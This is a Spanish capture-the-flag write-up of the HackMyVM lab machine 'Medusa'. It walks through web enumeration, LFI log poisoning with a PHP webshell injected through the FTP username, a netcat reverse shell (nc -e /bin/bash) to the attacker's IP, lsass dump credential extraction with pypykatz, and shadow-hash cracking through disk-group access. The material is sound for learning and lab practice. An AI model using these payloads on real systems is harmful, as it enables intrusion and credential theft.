---
layout: post
title: Medusa - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Noname \\
**Dificultad**: Fácil

![img](/imgs/write-ups/hackmyvm/medusa/medusa.png#center)

**Nota** Dado que la enumeración es un poco larga, describo solo los pasos fundamentales para resolver la máquina.

## Reconocimiento

Como es costumbre, lo primero es realizar un escaneo de los puertos disponibles.

```
$ sudo nmap -p- 192.168.1.87    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-02 12:49 EST
Nmap scan report for medusa.hmv (192.168.1.87)
Host is up (0.00010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:92:E6:7E (Oracle VirtualBox virtual NIC)
```

### Http (80)

Me descargo el fichero "index.html" y lo comparo usando el comando "diff" con el fichero default que se genera al abrir un servidor Apache. Como se puede ver hay algunas diferencias entre la que hay que destacar la palabra "Kraken".

```
$ diff /var/www/html/index.html index.html
38c38
<     background-color: #FFFFFF;
---
>     background-color: #555555;
95c95
<     background-color: #FFFFFF;
---
>     background-color: #999999;
351c351
<                 rel="nofollow">existing bug reports</a> before reporting a new bug.
---
>                 rel="nofollow">Kraken</a> open the door.
```

Continuando con la enumeración, utilizo gobuster para encontrar subdirectorios.

```
$ gobuster dir -u "http://192.168.1.87/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[...]
/.php                 (Status: 403) [Size: 277]
/manual               (Status: 301) [Size: 313] [--> http://192.168.1.87/manual/]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/hades                (Status: 301) [Size: 312] [--> http://192.168.1.87/hades/]
[...]
```

Uhh, "/hades" parece interesante... Continuo con la enumeración.

```
$ gobuster dir -u "http://192.168.1.87/hades" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php
[...]
/index.php            (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 277]
/door.php             (Status: 200) [Size: 555]
[...]
```

En "/door.php" se realiza una validacion de una palabra. Antes de intentar hacer un ataque de fuerza bruta pruebo con "Kraken"...

```
$ curl http://192.168.1.87/hades/door.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    
    <title>Door</title>
</head>
<body>
 <form action="d00r_validation.php" method="POST">
    <label for="word">Please enter the magic word...</label>
    <input id="word" type="text" required maxlength="6" name="word">
    <input type="submit" value="submit">
 </form>
</body>
</html>

$ curl http://192.168.1.87/hades/d00r_validation.php -X POST -d "word=Kraken"
<head>
    <link rel="stylesheet" href="styles.css">
    <title>Validation</title>
</head>
<source><marquee>medusa.hmv</marquee></source>
```

... correcto!! En la respuesta se puede ver el dominio "medusa.hmv". A continuación toca enumerar subdominios con "ffuf".


```
$ ffuf -u "http://medusa.hmv/" -H "Host: FUZZ.medusa.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 10674
[...]
dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 472ms]
```

Habiendo encontrado el subdominio "dev.medusa.hmv", continuo con la enumeración de ficheros y subdirectorios.

```
$ gobuster dir -u "http://dev.medusa.hmv/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,zip,bak
[...]
/.php                 (Status: 403) [Size: 279]
/files                (Status: 301) [Size: 316] [--> http://dev.medusa.hmv/files/]
/assets               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/assets/]
/css                  (Status: 301) [Size: 314] [--> http://dev.medusa.hmv/css/]
/manual               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/manual/]
/robots.txt           (Status: 200) [Size: 489]
[...]
```

```
$ gobuster dir -u "http://dev.medusa.hmv/files" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,zip,bak
[...]
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 0]
/system.php           (Status: 200) [Size: 0]
/readme.txt           (Status: 200) [Size: 144]
Progress: 38562 / 1102805 (3.50%)^C
```

"/system.php" es un tanto sospechoso... Voy a probar a enumerar parámetros en busca de un posible LFI o RCE.

```
$ ffuf -u "http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 0 
[...]
view                    [Status: 200, Size: 1452, Words: 14, Lines: 28, Duration: 3ms]
[...]
```

Parámetro encontrado!! Ahora a ver que archivos puedo leer.

```
$ ffuf -u "http://dev.medusa.hmv/files/system.php?view=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0
[...]
/var/log/vsftpd.log     [Status: 200, Size: 156, Words: 23, Lines: 3, Duration: 2ms]
[...]
```

vsftpd.log?? Interesante...

## Explotación

Teniendo acceso a un archivo de log como "vsftpd.log" y una vulnerabilidad LFI en la página web, es posible realizar un ataque de "Log Poisoning" al servicio ftp.

Para ello intento logearme en el servicio, pero en el nombre de usuario introduzco una "webshell".

```
$ ftp 192.168.1.87
Connected to 192.168.1.87.
220 (vsFTPd 3.0.3)
Name (192.168.1.87:kali): <?php system($_GET['cmd']);?>
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

Una vez enviado, puedo usar curl para ejecutar comandos en el servidor. Ahora solo queda crear un listener en la máquina local y ejecutar una reverse shell con "nc".

```
$ curl "http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log&cmd=nc+-e+/bin/bash+192.168.1.86+1234"
```

```
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.1.86] from (UNKNOWN) [192.168.1.87] 46670
whoami
www-data
:)
```

Conseguido!

## Escalado de privilegios

Enumerando un poco la máquina encuentro tanto el usuario "spectre" como un fichero zip sospecho en la carpeta "/...".

```
www-data@medusa:/...$ ls -la /home
total 12
drwxr-xr-x  3 root    root    4096 Jan 15 09:02 .
drwxr-xr-x 19 root    root    4096 Jan 15 11:07 ..
drwxr-xr-x  3 spectre spectre 4096 Jan 18 19:46 spectre
```

```
www-data@medusa:/...$ pwd; ls -la
/...
total 12108
drwxr-xr-x  2 root     root         4096 Jan 18 15:14 .
drwxr-xr-x 19 root     root         4096 Jan 15 11:07 ..
-rw-------  1 www-data www-data 12387024 Jan 18 15:13 old_files.zip
```

El fichero tiene contraseña, por lo que lo paso a mi máquina para intentar crackearlo.

```
$ zip2john old_files.zip > hash        

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)

$ john hash --show                                     
old_files.zip/lsass.DMP:medusa666:lsass.DMP:old_files.zip:old_files.zip

1 password hash cracked, 0 left
```

Tras obtener la contraseña, procedo a extraer un archivo "lsass.dmp".

**¿Qué es un fichero dmp?**\\
"Los archivos de volcado de memoria de Windows con la extensión DMP son, básicamente, archivos del sistema que se almacenan en formato binario.[...]"
-- [Fuente](https://www.islabit.com/115055/que-es-un-archivo-dmp-y-como-abrirlos-en-windows-10.html)

Para extraer la información uso "pypykatz" y se puede ver la contraseña del usuario "spectre".

```
$ sudo pypykatz lsa --json minidump lsass.DMP
[...]
                        "password": "5p3ctr3_p0is0n_xX",
                        "password_raw": "35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000",
                        "pin": null,
                        "pin_raw": null,
                        "tickets": [],
                        "username": "spectre"
                    }
                ],
[...]
kerberos_creds": [
                    {
                        "cardinfo": null,
                        "credtype": "kerberos",
                        "domainname": "Medusa-PC",
                        "luid": 1000050,
                        "password": "Wh1t3_h4ck",
                        "password_raw": "570068003100740033005f006800340063006b0000000000",
                        "pin": null,
                        "pin_raw": null,
                        "tickets": [],
                        "username": "LordP4"
                    }
                ],
[...]
```

También salgo yo por ahí :) ^^^

Ahora con la contraseña puedo logearme usando ssh. Rápidamente se puede ver que "spectre" pertenece al grupo **disk** por lo que tiene acceso al disco completo.

```
$ ssh spectre@192.168.1.87
spectre@192.168.1.87's password: 
[...]
spectre@medusa:~$ id
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

Utilizo "debugfs" para leer los archivos /etc/passwd y /etc/passwd dado que root no tiene id_rsa.

```
$ /usr/sbin/debugfs /dev/sda1
debugfs:  cat /etc/shadow
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
[...]
debugfs:  cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

Los paso a mi máquina e intento obtener la contraseña de root usando john.

```
$ unshadow pass shadow > hash_root
$ john hash_root --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt 
a*******a        (root)
```

Contraseña encontrada!!

```
spectre@medusa:~$ su root
Password: 
root@medusa:/home/spectre# :)
```

Y con esto la máquina ya estaría resuelta.

Muchas gracias a **Noname** por esta máquina.
